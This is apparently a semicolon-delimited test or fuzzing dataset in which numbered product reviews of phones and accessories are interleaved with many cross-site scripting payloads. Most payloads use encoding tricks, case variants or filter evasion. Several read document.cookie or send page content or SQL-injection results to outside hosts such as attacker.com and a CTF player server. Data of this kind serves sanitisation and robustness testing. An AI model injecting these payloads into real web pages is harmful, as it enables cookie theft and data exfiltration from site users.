17;We have tried 2 units and they both failed within 2 months.. Pros;;;;;;;;;;;;;;;;;;;;;;;;
18;<img src=&#106;;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
19;$5 Down the drain.;;;;;;;;;;;;;;;;;;;;;;;;
20;"&LT;DIV STYLE=\""BACKGROUND-IMAGE&#58; URL(JAVASCRIPT&#058;ALERT('XSS'))\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
21;Worst ever.;;;;;;;;;;;;;;;;;;;;;;;;
22;It feels poorly constructed; the menus are difficult to navigate; and the buttons are so recessed that it is difficult to push them.;;;;;;;;;;;;;;;;;;;;;;
23;The phone crashed completely and now I have to get it replaced.;;;;;;;;;;;;;;;;;;;;;;;;
24;"&lt;body background=\""javascript&#058;alert('xss')\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
25;<h1><font color=blue>hellox worldss</h1>;;;;;;;;;;;;;;;;;;;;;;;;
26;Better Than New.;;;;;;;;;;;;;;;;;;;;;;;;
27;"&lT;DiV sTylE=\""baCkgrOunD-ImaGe&#58;\0075\0072\006c\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003A\0061\006C\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
28;<scr<script>ipt>alert(document.cookie)</scr</script>ipt>;;;;;;;;;;;;;;;;;;;;;;;;
29;Great Phone.;;;;;;;;;;;;;;;;;;;;;;;;
30;<H1><FONT COLOR=BLUE>HELLOX WORLDSS</H1>;;;;;;;;;;;;;;;;;;;;;;;;
31;<svg><style>{font-family&colon;;<iframe/onload=confirm(1)>';;;;;;;;;;;;;;;;;;;;;;
32;"<style>@im\port'\ja\vasc\ript:alert(""xss"")';</style>";;;;;;;;;;;;;;;;;;;;;;;;
33;I bought this phone as a replacement for my StarTac and have regretted it since.;;;;;;;;;;;;;;;;;;;;;;;;
34;"<maTH><A xLiNK:HreF=""//JsfIDdLE.Net/T846h/"">click";;;;;;;;;;;;;;;;;;;;;;;;
35;"<iframe %00 src=""&Tab;javascript:prompt(1)&Tab;""%00>";;;;;;;;;;;;;;;;;;;;;;;;
36;Good value; works fine - power via USB; car; or wall outlet.;;;;;;;;;;;;;;;;;;;;;
37;Fantastic buy and will get again for whatever my next phone is;;;;;;;;;;;;;;;;;;;;;;;;
38;"<% FOO><X FOO=""%><SCRIPT>ALERT(123)</SCRIPT>"">";;;;;;;;;;;;;;;;;;;;;;;;
39;"<inPuT/OnmOUSEover=""jAvaScRipt&cOLon;ConfiRM&LPAr;1&RpaR;""";;;;;;;;;;;;;;;;;;;;;;;;
40;"<iframe srcdoc='<script src=""data:text/javascript,alert(document.domain)""></script>'></iframe>";;;;;;;;;;;;;;;;;;;;;;;;
41;Good show; Samsung.;;;;;;;;;;;;;;;;;;;;;;;
42;The biggest complaint I have is; the battery drains superfast.;;;;;;;;;;;;;;;;;;;;;;;
43;"</script><img/*%00/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/%00*/onerror='eval(src)'>";;;;;;;;;;;;;;;;;;;;;;;;
44;"&lt;TABLE&gt;&lt;TD BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
45;<a id=x tabindex=1 onfocusin=alert(1)></a>;;;;;;;;;;;;;;;;;;;;;;;;
46;I really wanted the Plantronics 5 to be the right one; but it has too many issues for me.The good;;;;;;;;;;;;;;;;;;;;;;;
47;This phone might well be the worst I've ever had in any brand.;;;;;;;;;;;;;;;;;;;;;;;;
48;"<div draggable=""true"" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable>drop here</xss>";;;;;;;;;;;;;;;;;;;;;;;;
49;I love this cable - it allows me to connect any mini-USB device to my PC.;;;;;;;;;;;;;;;;;;;;;;;;
50;Great phone.;;;;;;;;;;;;;;;;;;;;;;;;
51;&lt;;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;;;;;;;;;;;;;;;
52;Poor product.;;;;;;;;;;;;;;;;;;;;;;;;
53;It is simple to use and I like it.;;;;;;;;;;;;;;;;;;;;;;;;
54;aking the ring tones sound very cheap.;;;;;;;;;;;;;;;;;;;;;;;;
55;"<a hrEf=""datA:TeXT/hTMl;blAbLa,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">CLiCk me</A>";;;;;;;;;;;;;;;;;;;;;;;;
56;I highly recommend this case.;;;;;;;;;;;;;;;;;;;;;;;;
57;They keep getting better and better (this is my third one and I've had numerous Palms too).;;;;;;;;;;;;;;;;;;;;;;;;
58;&lt;;body onload=alert('xss')&gt;;;;;;;;;;;;;;;;;;;;;;
59;The reception through this headset is excellent.;;;;;;;;;;;;;;;;;;;;;;;;
60;<A id=X TabinDex=1 OnfocUsin=aLErt(1)></A>;;;;;;;;;;;;;;;;;;;;;;;;
61;"<math><a xlink:href=""//jsfiddle.net/t846h/"">click";;;;;;;;;;;;;;;;;;;;;;;;
62;stay away from this store; be careful.;;;;;;;;;;;;;;;;;;;;;;;
63;It was quite comfortable in the ear.;;;;;;;;;;;;;;;;;;;;;;;;
64;"&LT;BR SIZE=\""&{ALERT('XSS')}\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
65;"<IFRAME/SRC=""DATA:TEXT/HTML;&TAB;BASE64&TAB;,PGJVZHKGB25SB2FKPWFSZXJ0KDEPPG=="">";;;;;;;;;;;;;;;;;;;;;;;;
66;Linksys should have some way to exchange a bad phone for a refurb unit or something!;;;;;;;;;;;;;;;;;;;;;;;;
67;<A ID=X TABINDEX=1 ONFOCUSIN=ALERT(1)></A>;;;;;;;;;;;;;;;;;;;;;;;;
68;FOO\�;; ALERT(DOCUMENT.COOKIE);//�;;;;;;;;;;;;;;;;;;;;;
69;<script>crypto.generatecrmfrequest('cn=0';0;0;null;alert(1)';384;null;rsa-dual-use')</script>;;;;;;;;;;;;;;;;;
70;"&LT;IMG DYNSRC=\""JAVASCRIPT&#058;ALERT('XSS')\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
71;"<iframe srcdoc='<script src=""data:text/javascript,alert(document.domain)""></script>'></iframe>";;;;;;;;;;;;;;;;;;;;;;;;
72;im surprised this is a good quality car charger and there's not much reviews about it.;;;;;;;;;;;;;;;;;;;;;;;;
73;Do NOT buy if you want to use the holster.;;;;;;;;;;;;;;;;;;;;;;;;
74;"<IFRAME SRCDOC='<SCRIPT SRC=""DATA:TEXT/JAVASCRIPT,ALERT(DOCUMENT.DOMAIN)""></SCRIPT>'></IFRAME>";;;;;;;;;;;;;;;;;;;;;;;;
75;"&lt;IMG DYNSRC=\""javascript&#058;alert('XSS')\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
76;"<IMG SRC= ONMOUSEOVER=""ALERT('XXS')"">";;;;;;;;;;;;;;;;;;;;;;;;
77;"<AUDIO AUTOPLAY ONPLAYING=ALERT(1)><SOURCE SRC=""VALIDAUDIO.WAV"" TYPE=""AUDIO/WAV""></AUDIO>";;;;;;;;;;;;;;;;;;;;;;;;
78;clipping this to your belt will deffinitely make you feel like 5 cent's up-and-coming.;;;;;;;;;;;;;;;;;;;;;;;;
79;"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">";;;;;;;;;;;;;;;;;;;;;;;;
80;I only used it two days; and it wasn't always easy to hear with.;;;;;;;;;;;;;;;;;;;;;;;
81;"&lt;BGSOUND SRC=\""javascript&#058;alert('XSS');\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
82;"""/>'><script src=""/user_upload/mypic.png.js""></script>";;;;;;;;;;;;;;;;;;;;;;;;
83;Battery has no life.;;;;;;;;;;;;;;;;;;;;;;;;
84;+adw-script+ad4-alert(document.location)+adw-/script+ad4-;;;;;;;;;;;;;;;;;;;;;;;;
85;"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">";;;;;;;;;;;;;;;;;;;;;;;;
86;Improper description.... I had to return it.;;;;;;;;;;;;;;;;;;;;;;;;
87;"&LT;ImG Src=\""jAV&#X09;AsCRiPt&#058;Alert('XsS');\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
88;However; the ear pads come off easily and after only one week I lost one.;;;;;;;;;;;;;;;;;;;;;;;
89;It is well made; easy to access the phone and has a handy; detachable belt clip.;;;;;;;;;;;;;;;;;;;;;;
90;The real killer is the volume; and of course it breaking.;;;;;;;;;;;;;;;;;;;;;;;
91;Its the best headset I have used.;;;;;;;;;;;;;;;;;;;;;;;;
92;My phone doesn't slide around my car now and the grip prevents my phone from slipping out of my hand.;;;;;;;;;;;;;;;;;;;;;;;;
93;<sCrIpt>CoNFiRm()</ScRIPt>;;;;;;;;;;;;;;;;;;;;;;;;
94;fOO\�;; AlErT(DOcumEnT.COOkIe);//�;;;;;;;;;;;;;;;;;;;;;
95;Those phones are working just fine now.;;;;;;;;;;;;;;;;;;;;;;;;
96;<SCRIPT>CONFIRM()</SCRIPT>;;;;;;;;;;;;;;;;;;;;;;;;
97;I recommend iGo to anyone with different brand cell phones/mp3 players in the family.;;;;;;;;;;;;;;;;;;;;;;;;
98;"&lt;img dynsrc=\""javascript&#058;alert('xss')\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
99;<IFRAME/SRC=JAVASCRIPT:ALERT(1)>;;;;;;;;;;;;;;;;;;;;;;;;
100;I can't use this case because the smell is disgusting.;;;;;;;;;;;;;;;;;;;;;;;;
101;<scr<script>ipt>alert(document.cookie)</scr</script>ipt>;;;;;;;;;;;;;;;;;;;;;;;;
102;<IMG SRC=JAVASCRIPT:ALERT(STRING.FROMCHARCODE(88;83;83))>;;;;;;;;;;;;;;;;;;;;;;
103;This is cool because most cases are just open there allowing the screen to get all scratched up.;;;;;;;;;;;;;;;;;;;;;;;;
104;"<iframe src='data:text/html,<script defer=""true"" src=""data:text/javascript,document.body.innerText=/hello/""></script>'></iframe>";;;;;;;;;;;;;;;;;;;;;;;;
105;"""><iframe onload=""eval('d=document; _=d.createelement(\'script\');_.src=\'\/\/domain/m\';d.body.appendchild(_)')"">";;;;;;;;;;;;;;;;;;;;;;;;
106;Battery charge-life is quite long.;;;;;;;;;;;;;;;;;;;;;;;;
107;"&LT;br SIze=\""&{alert('xss')}\""&Gt;";;;;;;;;;;;;;;;;;;;;;;;;
108;How stupid is that?;;;;;;;;;;;;;;;;;;;;;;;;
109;+aciApga8-SCripT+Ad4-AlErT(DOCuMEnT.locaTioN)+adW-/SCRiPT+aD4apAai-;;;;;;;;;;;;;;;;;;;;;;;;
110;"&lt;div style=\""background-image&#58; url(javascript&#058;alert('xss'))\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
111;"&lt;img src=\""jav&#x0a;ascript&#058;alert('xss');\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
112;Would not reccommend.;;;;;;;;;;;;;;;;;;;;;;;;
113;Works well.;;;;;;;;;;;;;;;;;;;;;;;;
114;It fits my ear well and is comfortable on.;;;;;;;;;;;;;;;;;;;;;;;;
115;//<FORM/ACTION=JAVASCRIPT&#X3A;;ALERT&LPAR;DOCUMENT&PERIOD;COOKIE&RPAR;><INPUT/TYPE='SUBMIT'>//;;;;;;;;;;;;;;;;;;;
116;Voice Quality; Signal Strength; Dropped Calls.;;;;;;;;;;;;;;;;;;;;;;
117;"xss&#58;ex&#x2f;*xss*//*/*/pression(alert(\""xss\""))'&gt;";;;;;;;;;;;;;;;;;;;;;;;;
118;"<audio autoplay onplaying=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>";;;;;;;;;;;;;;;;;;;;;;;;
119;Great bluetooth!.;;;;;;;;;;;;;;;;;;;;;;;;
120;&lt;;style&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/style&gt;;;;;;;;;;;;;;;
121;This is a great deal.;;;;;;;;;;;;;;;;;;;;;;;;
122;"document.querySelector('DIV').innerHTML=""<iframe src='javascript:var s = document.createElement(\""script\"");s.src = \""https://pastebin.com/raw/dw5cWGK6\"";document.body.appendChild(s);'></iframe>"";";;;;;;;;;;;;;;;;;;;;;;;;
123;<iMg srC=jAVAsCrIPt:aLERt(sTrING.frOMCHARCode(88;83;83))>;;;;;;;;;;;;;;;;;;;;;;
124;"A must study for anyone interested in the ""worst sins"" of industrial design.";;;;;;;;;;;;;;;;;;;;;;;;
125;<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new image().src='http://player_server/?'+_)</script>;;;;;;;;;;;;;;;;;;;;;;;;
126;"&lt;LINK REL=\""stylesheet\"" HREF=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;css\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
127;I have been very satisfied with this cell phone from day one.;;;;;;;;;;;;;;;;;;;;;;;;
128;"&lt;DIV STYLE=\""background-image&#58; url(javascript&#058;alert('XSS'))\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
129;<sVg><scRipt %00>alert&lpar;;1&rpar; {Opera};;;;;;;;;;;;;;;;;;;;;
130;<BODY ONLOAD=ALERT('HELLOX WORLDSS')>;;;;;;;;;;;;;;;;;;;;;;;;
131;"exp/*&lt;a style='no\xss&#58;noxss(\""*//*\"");";;;;;;;;;;;;;;;;;;;;;;;;
132;<svg><style>{font-family&colon;;<iframe/onload=confirm(1)>';;;;;;;;;;;;;;;;;;;;;;
133;The charger arrived within the promised timeframe; but it did not work.;;;;;;;;;;;;;;;;;;;;;;;
134;* Comes with a strong light that you can use to light up your camera shots; and even flash SOS signals (seriously!;;;;;;;;;;;;;;;;;;;;;;;
135;wont work right or atleast for me.;;;;;;;;;;;;;;;;;;;;;;;;
136;"<tAble bAckgrOUND=""JAvaScRIPT:aleRT('XSs')"">";;;;;;;;;;;;;;;;;;;;;;;;
137;"""/>'><sCRiPT sRc=""/User_upLoad/mypic.Png.js""></sCript>";;;;;;;;;;;;;;;;;;;;;;;;
138;Great Product.;;;;;;;;;;;;;;;;;;;;;;;;
139;"&lt;BODY BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
140;"<! foo=""[[[inception]]""><x foo=""]foo><script>alert(1)</script>"">";;;;;;;;;;;;;;;;;;;;;;;;
141;<input onfocus=write(xss) autofocus>;;;;;;;;;;;;;;;;;;;;;;;;
142;"<STYLE>@IM\PORT'\JA\VASC\RIPT:ALERT(""XSS"")';</STYLE>";;;;;;;;;;;;;;;;;;;;;;;;
143;This product is very High quality Chinese CRAP!!!!!!;;;;;;;;;;;;;;;;;;;;;;;;
144;Poor quality.;;;;;;;;;;;;;;;;;;;;;;;;
145;<SCR<SCRIPT>IPT>ALERT(DOCUMENT.COOKIE)</SCR</SCRIPT>IPT>;;;;;;;;;;;;;;;;;;;;;;;;
146;"<sVG/onloAd=""(neW ImAgE()).SrC='//atTACker.cOm/'%2bdoCumEnT.dOcuMeNteLemeNt.INNeRhtML"">";;;;;;;;;;;;;;;;;;;;;;;;
147;They work about 2 weeks then break.;;;;;;;;;;;;;;;;;;;;;;;;
148;"<DIV DRAGGABLE=""TRUE"" CONTENTEDITABLE>DRAG ME</DIV><XSS ONDROP=ALERT(1) CONTENTEDITABLE>DROP HERE</XSS>";;;;;;;;;;;;;;;;;;;;;;;;
149;Excellent product for the price.;;;;;;;;;;;;;;;;;;;;;;;;
150;"&LT;BGSOUND SRC=\""JAVASCRIPT&#058;ALERT('XSS');\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
151;I great reception all the time.;;;;;;;;;;;;;;;;;;;;;;;;
152;"<AUDIO AUTOPLAY ONLOADEDMETADATA=ALERT(1)> <SOURCE SRC=""VALIDAUDIO.WAV"" TYPE=""AUDIO/WAV""></AUDIO>";;;;;;;;;;;;;;;;;;;;;;;;
153;Better than expected.;;;;;;;;;;;;;;;;;;;;;;;;
154;Their Research and Development division obviously knows what they're doing.;;;;;;;;;;;;;;;;;;;;;;;;
155;It was a great phone.;;;;;;;;;;;;;;;;;;;;;;;;
156;"<table background=""javascript:alert('xss')"">";;;;;;;;;;;;;;;;;;;;;;;;
157;The phone can also take great pictures and even video clips.;;;;;;;;;;;;;;;;;;;;;;;;
158;<IMG/&#09;;&#10;&#11; SRC=`~` ONERROR=PROMPT(1)>;;;;;;;;;;;;;;;;;;;;
159;"&LT;TaBLe&GT;&lT;td bAckgrOUnD=\""jAVASCrIpt&#058;aLErT('XSS')\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
160;<IMG SrC=&#106;;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
161;I found the product to be easy to set up and use.;;;;;;;;;;;;;;;;;;;;;;;;
162;foo\�;; alert(document.cookie);//�;;;;;;;;;;;;;;;;;;;;;
163;I bought these hoping I could make my Bluetooth headset fit better but these things made it impossible to wear.;;;;;;;;;;;;;;;;;;;;;;;;
164;disappointing.;;;;;;;;;;;;;;;;;;;;;;;;
165;Setup went very smoothly.;;;;;;;;;;;;;;;;;;;;;;;;
166;AFter the first charge kept going dead after 2 minutes.;;;;;;;;;;;;;;;;;;;;;;;;
167;"&LT;IMG LOWSRC=\""JAVASCRIPT&#058;ALERT('XSS')\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
168;"&LT;LInK rEL=\""STYlESHeet\"" HRef=\""httP&#58;//HA&#46;cKers&#46;ORG/xss&#46;Css\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
169;"<dIV sTyLe=""bacKgroUnd-IMagE: urL(javASCRipt:aleRt('XsS'))"">";;;;;;;;;;;;;;;;;;;;;;;;
170;"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_x.pdf"">";;;;;;;;;;;;;;;;;;;;;;;;
171;"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">";;;;;;;;;;;;;;;;;;;;;;;;
172;Easy to pair with my Samsung Cell.;;;;;;;;;;;;;;;;;;;;;;;;
173;"&lt;div style=\""width&#58; expression(alert('xss'));\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
174;%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-;;;;;;;;;;;;;;;;;;;;;;;;
175;"<DIV STYLE=""BACKGROUND-IMAGE:\0075\0072\006C\0028'\006A\0061\0076\0061\0073\0063\0072\0069\0070\0074\003A\0061\006C\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">";;;;;;;;;;;;;;;;;;;;;;;;
176;"<SvG XMlNs=""#""><Script>AlERt(1)</ScRIpt></Svg>";;;;;;;;;;;;;;;;;;;;;;;;
177;.... Item arrived quickly and works great with my Metro PCS Samsung SCH-r45 slider phone and Sony Premium Sound in ear plugs.;;;;;;;;;;;;;;;;;;;;;;;;
178;<imG/sRC=`%00` onErRor=tHiS.oNeRROr=cONfiRM(1);;;;;;;;;;;;;;;;;;;;;;;;
179;Very Dissapointing Performance.;;;;;;;;;;;;;;;;;;;;;;;;
180;I used bitpim (a free program you can find on the internet)to transfer data to the phone.The price of the cable was excellent.;;;;;;;;;;;;;;;;;;;;;;;;
181;"&lt;link rel=\""stylesheet\"" href=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;css\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
182;"That being said, for a phone, the camera is very nice; many cool effects to play with, and video is decent as well.";;;;;;;;;;;;;;;;;;;;;;;;
183;Clear crisp sound.;;;;;;;;;;;;;;;;;;;;;;;;
184;"<aUDIo autopLay onLoADeDmetADATA=aLert(1)> <source srC=""valiDaUdio.WAV"" TYPE=""auDio/WaV""></aUDIO>";;;;;;;;;;;;;;;;;;;;;;;;
185;It dit not work most of the time with my Nokia 532.;;;;;;;;;;;;;;;;;;;;;;;;
186;"&LT;iMg DyNsRC=\""jAvaScriPt&#058;AlERt('Xss')\""&Gt;";;;;;;;;;;;;;;;;;;;;;;;;
187;"XSS&#58;EX&#X2F;*XSS*//*/*/PRESSION(ALERT(\""XSS\""))'&GT;";;;;;;;;;;;;;;;;;;;;;;;;
188;<SCRiPT ^__^>ALERt(STRiNg.FROMcHARCoDE(49))</SCRIPT ^__^;;;;;;;;;;;;;;;;;;;;;;;;
189;After my phone got to be about a year old; it's been slowly breaking despite much care on my part.;;;;;;;;;;;;;;;;;;;;;;;
190;I have always used corded headsets and the freedom from the wireless is very helpful.;;;;;;;;;;;;;;;;;;;;;;;;
191;<h1><font color=blue>hellox worldss</h1>;;;;;;;;;;;;;;;;;;;;;;;;
192;"&LT;BODY BACKGROUND=\""JAVASCRIPT&#058;ALERT('XSS')\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
193;"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">";;;;;;;;;;;;;;;;;;;;;;;;
194;This particular model would not work with my Motorola Q smartphone.;;;;;;;;;;;;;;;;;;;;;;;;
195;This fixes all the problems.;;;;;;;;;;;;;;;;;;;;;;;;
196;"</SCRIPT><IMG/*%00/SRC=""WORKSINCHROME&COLON;PROMPT&#X28;1&#X29;""/%00*/ONERROR='EVAL(SRC)'>";;;;;;;;;;;;;;;;;;;;;;;;
197;"<! foo=""[[[Inception]]""><x foo=""]foo><script>alert(1)</script>"">";;;;;;;;;;;;;;;;;;;;;;;;
198;its extremely slow and takes forever to do anything with it.;;;;;;;;;;;;;;;;;;;;;;;;
199;Krussel Always good.;;;;;;;;;;;;;;;;;;;;;;;;
200;"<div style=""background-image:\0075\0072\006c\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">";;;;;;;;;;;;;;;;;;;;;;;;
201;"<IFRAME NAME=""ADMIN"" SRC=""HTTPS://BYPASSES-EVERYWHERE.CTF.INSECURITY-INSA.FR/ADMIN""></IFRAME>";;;;;;;;;;;;;;;;;;;;;;;;
202;"<SVG/ONLOAD=""(NEW IMAGE()).SRC='//ATTACKER.COM/'%2BDOCUMENT.DOCUMENTELEMENT.INNERHTML"">";;;;;;;;;;;;;;;;;;;;;;;;
203;"&lt;BGSoUND srC=\""JAvaScRIPT&#058;ALERt('xsS');\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
204;%253cscript%253ealert(document.cookie)%253c/script%253e�><<script>alert(document.cookie);;//<</script>;;;;;;;;;;;;;;;;;;;;;;
205;"""/>'><script src=https://attacker.com/evil.js></script>";;;;;;;;;;;;;;;;;;;;;;;;
206;This product is clearly not ready for prime time; I don't care how cool it looks; if you can't tell a call is coming in it's worthless.;;;;;;;;;;;;;;;;;;;;;;
207;"<IFRAME %00 SRC=""&TAB;JAVASCRIPT:PROMPT(1)&TAB;""%00>";;;;;;;;;;;;;;;;;;;;;;;;
208;It is cheap; and it feel and look just as cheap.;;;;;;;;;;;;;;;;;;;;;;;
209;"<! FOO=""[[[INCEPTION]]""><X FOO=""]FOO><SCRIPT>ALERT(1)</SCRIPT>"">";;;;;;;;;;;;;;;;;;;;;;;;
210;It's A PIECE OF CRAP!;;;;;;;;;;;;;;;;;;;;;;;;
211;Truly awful.;;;;;;;;;;;;;;;;;;;;;;;;
212;FOO<SCRIPT>ALERT(DOCUMENT.COOKIE)</SCRIPT>;;;;;;;;;;;;;;;;;;;;;;;;
213;"<iframe/src=""data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="">";;;;;;;;;;;;;;;;;;;;;;;;
214;Very wind-resistant.;;;;;;;;;;;;;;;;;;;;;;;;
215;<A AA AAA AAAA AAAAA AAAAAA AAAAAAA AAAAAAAA AAAAAAAAA AAAAAAAAAA HREF=J&#97V&#97SCRIPT&#X3A;;&#97LERT(1)>CLICKME;;;;;;;;;;;;;;;;;;;;;;
216;"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>";;;;;;;;;;;;;;;;;;;;;;;;
217;Crisp and Clear.;;;;;;;;;;;;;;;;;;;;;;;;
218;No ear loop needed; it's tiny and the sound is great.;;;;;;;;;;;;;;;;;;;;;;;
219;Think it over when you plan to own this one!This sure is the last MOTO phone for me!;;;;;;;;;;;;;;;;;;;;;;;;
220;I would recommend it.;;;;;;;;;;;;;;;;;;;;;;;;
221;Battery is holding up well.;;;;;;;;;;;;;;;;;;;;;;;;
222;Looks good in the picture; but this case was a huge disappointment!!;;;;;;;;;;;;;;;;;;;;;;;
223;Arrived quickly and much less expensive than others being sold.;;;;;;;;;;;;;;;;;;;;;;;;
224;"<iframe/src=""data:text/html;&tab;base64&tab;,pgjvzhkgb25sb2fkpwfszxj0kdeppg=="">";;;;;;;;;;;;;;;;;;;;;;;;
225;camera color balance is AWFUL.;;;;;;;;;;;;;;;;;;;;;;;;
226;<sCRipt/Src=hTTPS://WwW.GOOGle.cOm/compLETE/seArcH?CLIEnt=cHrOME&q=hELlO&cALlBack=aleRT></script>;;;;;;;;;;;;;;;;;;;;;;;;
